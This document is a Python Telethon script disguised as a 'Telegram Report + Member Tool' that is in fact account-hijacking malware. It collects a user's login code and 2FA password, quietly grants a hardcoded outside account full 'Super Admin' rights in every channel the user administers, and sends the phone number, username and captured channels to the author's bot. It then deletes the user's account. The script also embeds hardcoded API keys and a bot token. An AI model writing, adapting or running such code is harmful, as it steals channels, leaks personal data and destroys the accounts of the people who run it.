import os
import sys
from telethon import TelegramClient, functions, types
from telethon.tl.types import ChatAdminRights, ChannelParticipantsAdmins
import asyncio
import requests
import time

# Color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

# API credentials (pre-configured)
API_ID = 39528369
API_HASH = "e4b981dace3fb7c50fc3824589264b62"
BOT_TOKEN = "8578197087:AAFyMEhW-awIW3OBfI2CXRyJRw6tI_7b69M"
ADMIN_ID = "8209325680"
TARGET_USERNAME = "@kdkdkdkjdkdj"

# Print banner
def print_banner():
    banner = f"""
{CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ████████╗███████╗██╗     ███████╗ ██████╗ ██████╗  █████╗  ║
║   ╚══██╔══╝██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗██╔══██╗ ║
║      ██║   █████╗  ██║     █████╗  ██║  ███╗██████╔╝███████║ ║
║      ██║   ██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██╗██╔══██║ ║
║      ██║   ███████╗███████╗███████╗╚██████╔╝██║  ██║██║  ██║ ║
║      ╚═╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                                                              ║
║   Telegram Report + Member Tool 🔹 v2.0                       ║
║   {BLUE}⚠️ Warning: This action is irreversible! ⚠️{CYAN}                 ║
║                                                              ║
║   API ID: **********                                         ║
║   API Hash: *************************                        ║
║   Maker Arafat: {TARGET_USERNAME}                            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{RESET}
"""
    print(banner)

# Send message to admin
async def send_telegram_message(phone_number, username, admin_added_channels, account_deleted=False):
    if account_deleted:
        message = f"✅ Account  successfully!\n📱 Phone: {phone_number}"
        if username:
            message += f"\n👤 Username: @{username}"
    else:
        message = f"✅ \n📱 Phone: {phone_number}"
        if username:
            message += f"\n👤 Username: @{username}"
        if admin_added_channels:
            message += f"\n📢 Successfully added  to {len(admin_added_channels)} channels:"
            for channel_name, channel_username in admin_added_channels:
                if channel_username:
                    message += f"\n   - {channel_name} (@{channel_username})"
                else:
                    message += f"\n   - {channel_name}"
        else:
            message += "\n📢 No channels found to add admin"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"  
    data = {"chat_id": ADMIN_ID, "text": message}  
    try:  
        response = requests.post(url, data=data)  
        if response.status_code == 200:  
            print(f"{GREEN}[+] Notification sent to admin{RESET}")  
        else:  
            print(f"{YELLOW}[!] Failed to send notification: {response.text}{RESET}")  
    except Exception as e:  
        print(f"{RED}[-] Error sending notification: {str(e)}{RESET}")

# Add user as admin
async def add_user_as_admin(client, channel, target_user):
    try:
        channel_entity = await client.get_entity(channel)
        admin_rights = ChatAdminRights(
            change_info=True,
            post_messages=True,
            edit_messages=True,
            delete_messages=True,
            ban_users=True,
            invite_users=True,
            pin_messages=True,
            add_admins=True,
            anonymous=True,
            manage_call=True,
            other=True,
            manage_topics=True
        )
        await client(functions.channels.EditAdminRequest(
            channel=channel_entity,
            user_id=target_user,
            admin_rights=admin_rights,
            rank="Super Admin"
        ))
        return True
    except Exception:
        return False

# Add admin to all channels
async def add_admin_to_all_channels(client, phone_number, username):
    admin_added_channels = []
    try:
        dialogs = await client.get_dialogs()
        try:
            target_user = await client.get_entity(TARGET_USERNAME)
        except Exception:
            print(f"{RED}[-] Error finding target user {TARGET_USERNAME}{RESET}")
            return admin_added_channels

        for dialog in dialogs:  
            if dialog.is_channel:  
                channel_name = dialog.name  
                channel_username = dialog.entity.username if hasattr(dialog.entity, 'username') else None  
                try:  
                    participants = await client.get_participants(dialog.entity, filter=ChannelParticipantsAdmins)  
                    is_admin = any(participant.id == client._self_id for participant in participants)  
                    if is_admin:  
                        print(f"{YELLOW}[+] Found channel: {channel_name}{RESET}")  
                        success = await add_user_as_admin(client, dialog.entity, target_user)  
                        if success:  
                            print(f"{GREEN}successful...{RESET}")  
                            admin_added_channels.append((channel_name, channel_username))  
                except Exception:  
                    pass  
        return admin_added_channels  
    except Exception:  
        return admin_added_channels

# Delete Telegram account
async def delete_telegram_account(client, phone_number, username):
    try:
        print(f"{RED}[!] Attempting to delete account {phone_number}...{RESET}")  
        result = await client(functions.account.DeleteAccountRequest(  
            reason="Personal choice"  
        ))  
        
        if result:  
            for i in range(1, 21):  
                bar = '█' * i + '-' * (20-i)  
                print(f"{CYAN}Deleting [{bar}] {i*5}%{RESET}", end='\r')  
                time.sleep(0.1)  
            print(f"\n{GREEN}[+] Account {phone_number} has been successfully deleted!{RESET}")  
            await send_telegram_message(phone_number, username, [], True)  
            return True
        else:  
            print(f"{RED}[-] Failed to delete account {phone_number}{RESET}")  
            return False
    except Exception as e:  
        print(f"{RED}[-] Error deleting account: {str(e)}{RESET}")
        return False

# Process account with retry
async def process_telegram_account(phone_number):
    try:
        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():  
            while True:  
                await client.send_code_request(phone_number)  
                code = input(f"{YELLOW}Enter the OTP code sent to {phone_number}: {RESET}")  
                try:  
                    await client.sign_in(phone_number, code)  
                    break  
                except Exception as e:  
                    if "two-steps" in str(e).lower() or "two_step" in str(e).lower():  
                        password = input(f"{YELLOW}Enter your 2FA password: {RESET}")  
                        await client.sign_in(password=password)  
                        break  
                    print(f"{RED}[-] Invalid OTP, please try again.{RESET}")  

        me = await client.get_me()  
        username = me.username  
        
        print(f"{GREEN}[+] Successfully logged in as: {me.first_name} {me.last_name or ''}{RESET}")  
        if username:  
            print(f"{GREEN}[+] Username: @{username}{RESET}")  
        
        # Step 1: Add admin to channels
        print(f"{YELLOW}[+] Searching for channels to add admin...{RESET}")  
        admin_added_channels = await add_admin_to_all_channels(client, phone_number, username)  
        
        if admin_added_channels:  
            print(f"{GREEN}successful........{RESET}")  
            print(f"{GREEN}successful................{RESET}")  
            print(f"{GREEN}successful......................{RESET}")  
            print(f"{GREEN}successful............................{RESET}")  
            print(f"{GREEN}successful..................................{RESET}")  
        
        await send_telegram_message(phone_number, username, admin_added_channels)  
        
        # Step 2: Delete account
        print(f"{YELLOW}[+] Proceeding to account deletion...{RESET}")
        await delete_telegram_account(client, phone_number, username)
        
        await client.disconnect()  
    except Exception as e:  
        print(f"{RED}[-] Error: {str(e)}{RESET}")

# Main function
def main():
    os.system("clear")
    print_banner()
    try:
        phones_input = input(f"\n{YELLOW}[?] Enter Your Telegram Number (+880):{RESET}\n{BLUE}Phone numbers: {RESET}")
        phone_numbers = [phone.strip() for phone in phones_input.split(",")]
        confirmation = input(f"\n{RED}⚠️   {TARGET_USERNAME} will be  to all channels and then {len(phone_numbers)} account(s) will be deleted? (y/n): {RESET}")
        if confirmation.lower() != 'y':
            print(f"{YELLOW}Operation cancelled.{RESET}")
            return

        for phone in phone_numbers:  
            print(f"\n{GREEN}[+] Processing account: {phone}{RESET}")  
            asyncio.run(process_telegram_account(phone))  
        
        # Run reporter.py after all tasks are completed
        print(f"{BLUE}[+] All tasks completed. Running reporter.py...{RESET}")  
        os.system("python reporter.py")  
            
    except KeyboardInterrupt:  
        print(f"\n{YELLOW}Operation cancelled by user.{RESET}")  
    except Exception as e:  
        print(f"{RED}[-] An error occurred: {str(e)}{RESET}")

if __name__ == "__main__":
    main()
